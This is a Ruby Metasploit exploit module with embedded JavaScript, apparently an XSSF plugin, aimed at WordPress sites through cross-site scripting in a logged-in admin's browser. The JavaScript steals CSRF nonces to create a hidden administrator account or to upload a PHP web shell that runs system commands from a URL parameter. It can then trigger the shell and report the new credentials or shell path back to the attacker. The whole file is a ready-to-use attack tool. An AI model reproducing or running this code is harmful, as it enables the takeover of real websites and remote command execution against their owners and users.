require 'msf/core'
require 'msf/base/xssf'


class Metasploit3 < Msf::Exploit::Remote
        include Msf::Xssf::XssfServer

        # Module initialization
        def initialize(info = {})
                super(update_info(info,
                        'Name'          => 'wordpress_xss',
                        'Description'   => 'wordpress xss add_admin/shell_upload',
                        'Author'        => ['white_sheep'],
                        'License'       => BSD_LICENSE,
                        'Platform'      => ['php'],
                        'Arch'          => ARCH_PHP,
                        'Payload'        =>
                                {
                                        'Space'       => 8190,
                                        'DisableNops' => true,
                                        'BadChars'    => %q|'"`|,
                                        'Compat'      =>
                                                {
                                                        'ConnectionType' => 'find',
                                                },
                                        'Keys'        => ['php'],
                                },
                        'DisclosureDate' => 'Nov 23 2012',
                        'Targets'        => [ ['Automatic', { }], ],
                        'DefaultTarget' => 0
                ))

                register_options(
                        [
                                OptString.new('ACTION', [true, 'upload_shell, upload_shell_call, add_admin ']),
                                OptString.new('WPPATH', [true, 'Wordpress root path.']),
                                OptString.new('USER', [false, 'new administrator name']),
                                OptString.new('PASS', [false, 'new administrator password'])
                        ], self.class
                )
        end

        def on_request_uri(cli, req)
                if datastore['ACTION'] != 'add_admin'
                        shell_buffer = '<?php ' + payload.encoded + '?>'
                else
                        shell_buffer = '';
                end

                js_tosend = <<END
/*
        xssf plugin.
        coded by white_sheep
*/

(function(action, wp_path, options){

        var WP_XSS = function(){
                this.eol = '\\r\\n';
                this.options = options;
                this.default_shell =    '<?php system($_GET["cmd"]); ?>';
        }

        WP_XSS.prototype.xssf = function(msg){
                if ( typeof XSSF_POST != 'undefined' ){
                        XSSF_POST(msg, this.options.module_name);
                }
        }

        WP_XSS.prototype.prepare_multiform = function(form){
                var request = { headers : {}, body : '' };

                var boundary = '---------------------------';
                boundary += Math.floor(Math.random()*32768);
                boundary += Math.floor(Math.random()*32768);
                boundary += Math.floor(Math.random()*32768);

                request.headers['Content-Type'] = 'multipart/form-data; boundary=' + boundary;

                for ( var i = 0; i < form.length; i++ ){
                        request.body += '--' + boundary + this.eol + 
                                                        'Content-Disposition: form-data; name="' + form[i].name + '"' + 
                                                        (( typeof form[i].file != 'undefined' ) ? 
                                                                (
                                                                        '; filename="' + form[i].file.name + '"' + this.eol + 
                                                                        'Content-Type: ' + form[i].file.type
                                                                ) : ('')) +
                                                        this.eol + this.eol +
                                                        form[i].value + this.eol; 
                }

                return request;
        }

        WP_XSS.prototype.XHR = function(){
                try {
                        return new ActiveXObject('Microsoft.XMLHTTP');
                } catch(e) {
                        return new XMLHttpRequest();
                }
        }

        WP_XSS.prototype.get_wpnonce_user = function(cb){
                var xhr = this.XHR();
                xhr.open('GET', wp_path + '/wp-admin/user-new.php');
                xhr.onload = function(){
                        var res = xhr.responseText;
                        var _wpnonce = /name="_wpnonce_create-user" value="([^"]+)"/.exec(res);
                        if ( _wpnonce == null )
                                return false;

                        if ( _wpnonce.length > 1 ){
                                cb(_wpnonce[1]);
                        }
                }

                xhr.onerror = function(){
                        console.log(xhr);
                }

                xhr.send();
        }

        WP_XSS.prototype.get_wpnonce = function(cb){
                var xhr = this.XHR();
                xhr.open('GET', wp_path + '/wp-admin/plugin-install.php?tab=upload');
                xhr.onload = function(){
                        var res = xhr.responseText;
                        var _wpnonce = /name="_wpnonce" value="([^"]+)"/.exec(res);
                        if ( _wpnonce == null )
                                return false;

                        if ( _wpnonce.length > 1 ){
                                cb(_wpnonce[1]);
                        }
                }

                xhr.onerror = function(){
                        console.log(xhr);
                }

                xhr.send();
        }

        WP_XSS.prototype.randomString = function(string_length) {
                var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz';
                var randomstring = '';
                for (var i=0; i<string_length; i++) {
                        var rnum = Math.floor(Math.random() * chars.length);
                        randomstring += chars.substring(rnum,rnum+1);
                }
                return randomstring;
        }

        WP_XSS.prototype.add_admin = function(){
                /*
                        first poc: http://www.ihteam.net/advisory/bsuite-wordpress-permanent-xss/
                */

                var self = this;

                this.get_wpnonce_user(function(_wpnonce){
                        var user = ( typeof self.options.user == 'undefined' ) ? self.randomString(10) : self.options.user;
                        var pass = ( typeof self.options.password == 'undefined' ) ? self.randomString(10) : self.options.password;

                        var form = [
                                {
                                        name: '_wpnonce_create-user',
                                        value: _wpnonce
                                },
                                {
                                        name: '_wp_http_referer',
                                        value: wp_path + '/wordpress/wp-admin/user-new.php'
                                },
                                {
                                        name: 'action',
                                        value: 'createuser'
                                },
                                {
                                        name: 'createuser',
                                        value: 'Add New User'
                                },
                                {
                                        name: 'email',
                                        value: 'wpxss@mail.it'
                                },
                                {
                                        name: 'first_name',
                                        value: ''
                                },
                                {
                                        name: 'last_name',
                                        value: ''
                                },
                                {
                                        name: 'pass1',
                                        value: pass
                                },
                                {
                                        name: 'pass2',
                                        value: pass
                                },
                                {
                                        name: 'role',
                                        value: 'administrator'
                                },
                                {
                                        name: 'url',
                                        value: ''
                                },
                                {
                                        name: 'user_login',
                                        value: user
                                }
                        ];

                        var multiform = self.prepare_multiform(form);
                        var xhr_user = self.XHR();
                        xhr_user.open('POST', wp_path + '/wp-admin/user-new.php');

                        for ( var header in multiform.headers ){
                                xhr_user.setRequestHeader(header, multiform.headers[header]);
                        }

                        xhr_user.onload = function() {
                                self.xssf('user added. user: ' + user + ' ; password: ' + pass);
                        }

                        xhr_user.onerror = function() {
                            console.log(xhr);
                        }

                        xhr_user.send(multiform.body);
                });
        }


        WP_XSS.prototype.upload_shell = function(call){
                var self = this;

                if ( typeof call == 'undefined' )
                        call = false;

                this.get_wpnonce(function(_wpnonce){
                        var shellName = self.randomString(8) + '.php';
                        var form = [
                                {
                                        name: 'pluginzip',
                                        value: ( typeof self.options.php_shell == 'undefined' ) ? self.default_shell : self.options.php_shell,
                                        file : {
                                                name: shellName,
                                                type: 'application/php'
                                        }
                                },
                                {
                                        name: '_wpnonce',
                                        value: _wpnonce
                                },
                                {
                                        name: '_wp_http_referer',
                                        value: wp_path + '/wp-admin/plugin-install.php?tab=upload'
                                }
                        ];

                        var multiform = self.prepare_multiform(form);

                        var xhr_upload = self.XHR();
                        xhr_upload.open('POST', wp_path + '/wp-admin/update.php?action=upload-plugin');


                        for ( var header in multiform.headers ){
                                xhr_upload.setRequestHeader(header, multiform.headers[header]);
                        }

                        xhr_upload.onload = function() {

                                var res = xhr_upload.responseText;
                                var userSettings_parse = /var userSettings = {[^}]+}/.exec(res);

                                if ( userSettings_parse.length > 0 ){
                                        eval(userSettings_parse[0]);
                                        var serverDate =  new Date(parseInt(userSettings.time + '000'));
                                        var Year = serverDate.getFullYear();
                                        var Month = serverDate.getMonth() + 1;
                                        var shellPath = userSettings.url + 'wp-content/uploads/' + Year + '/' + Month + '/' + shellName;

                                        if ( call ){
                                                var xhr_call = self.XHR();
                                                xhr_call.open('GET', shellPath);
                                                xhr_call.send();
                                        }

                                        self.xssf('shell uploaded. -> ' + shellPath );
                                }
                        }

                        xhr_upload.onerror = function() {
                            console.log(xhr);
                        }

                        xhr_upload.send(multiform.body);
                });
        }

        var wpxss = new WP_XSS();

        switch(action){
                case 'upload_shell':
                        wpxss.upload_shell(false);
                break;

                case 'upload_shell_call':
                        wpxss.upload_shell(true);
                break;

                case 'add_admin':
                        wpxss.add_admin();
                break;
        }

})(
'#{datastore['ACTION']}',
'#{datastore['WPPATH']}',
{
        module_name: '#{self.name}',
        php_shell: '#{shell_buffer}',
        user: '#{datastore['USER']}',
        password: '#{datastore['PASS']}'
});
END
                send_response(cli, js_tosend)
        end
end
